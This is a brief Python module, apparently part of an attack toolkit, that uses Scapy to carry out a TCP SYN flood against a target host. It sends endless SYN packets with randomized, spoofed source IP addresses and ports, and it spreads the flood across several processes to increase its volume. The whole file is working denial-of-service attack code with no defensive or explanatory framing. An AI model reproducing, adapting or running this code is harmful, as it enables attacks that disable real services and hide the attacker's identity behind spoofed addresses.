from utils.host import Host
from scapy.all import IP, TCP, send
import random
import multiprocessing


def syn_flood(host: Host, port: int = 0):
    while True:
        source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        source_port = random.randint(1, 65535)
        packet = IP(src=source_ip, dst=host.ip) / TCP(sport=source_port, dport=port, flags="S")
        send(packet)


def start_syn_flood(host: Host, port: int = 0, threads: int = 1):
    process_list = []
    for i in range(threads):
        process = multiprocessing.Process(target=syn_flood, args=(host, port))
        process_list.append(process)
        process.start()

    for process in process_list:
        process.join()
